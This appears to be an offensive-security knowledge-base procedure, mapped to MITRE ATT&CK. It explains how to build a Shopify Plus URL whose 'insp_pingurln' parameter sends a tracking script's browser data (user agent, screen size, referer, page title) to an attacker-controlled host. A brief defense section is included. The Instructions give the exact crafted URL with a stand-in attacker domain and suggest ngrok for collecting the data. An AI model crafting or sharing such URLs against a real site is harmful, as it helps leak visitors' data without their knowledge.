---
id: uuid-proc1
tags:
  - csrf
  - url-crafting
  - shopify
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:22.426Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
---

# Craft-Malicious-URL-with-insp-pingurln-Parameter

## Summary

This procedure involves constructing a malicious URL for the Shopify plus page by appending the 'insp_pingurln' parameter, which redirects third-party JavaScript tracking requests to an attacker-controlled server, setting up a CSRF attack for information disclosure.

## Description

In the context of the Shopify plus page vulnerability, the third-party JavaScript lacks proper CSRF protections and uses the 'insp_pingurln' query parameter to determine the endpoint for sending tracking data. By crafting a URL that sets this parameter to an attacker domain, the subsequent page load triggers an unauthenticated POST request leaking browser details like user agent, screen dimensions, referer, and page title. This is useful in drive-by compromise scenarios where victims are tricked into visiting the URL, enabling passive data collection without interaction.

## Requirements

1. Control over a domain or server to receive POST requests (e.g., via ngrok for local testing)
2. Knowledge of URL encoding to handle special characters in the parameter value
3. Web browser for testing the URL construction

## Defense

Defensive measures and detection strategies:

- Implement Content Security Policy (CSP) to restrict cross-origin requests from third-party scripts
- Use CSRF tokens in all POST endpoints, even for tracking scripts
- Monitor for anomalous query parameters like 'insp_pingurln' in access logs

## Objectives

1. Prepare a functional malicious URL that hijacks the tracking endpoint
2. Ensure the parameter is correctly set without breaking the page load
3. Enable subsequent CSRF trigger for data exfiltration

## Instructions

### Step 1: Identify Attacker Endpoint

**Context**: Set up or identify the URL of your controlled server that will capture the incoming POST data.

For example, use a service like ngrok to expose a local server: start ngrok on port 80 to get a public URL like https://abc123.ngrok.io.

### Step 2: Construct the Malicious URL

**Context**: Append the 'insp_pingurln' parameter to the base Shopify plus URL, encoding the attacker endpoint as needed.

Construct the URL as: https://www.shopify.com/plus?insp_pingurln=https://your-attacker-domain.com/#

> Note the trailing '#' to ensure the parameter is processed as a fragment if needed, though query params are standard here. Test by visiting in an incognito browser to verify no immediate errors.

**Expected Output**: A shareable URL that loads the Shopify page normally but sets the tracking target.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[url-crafting]]
- [[shopify]]
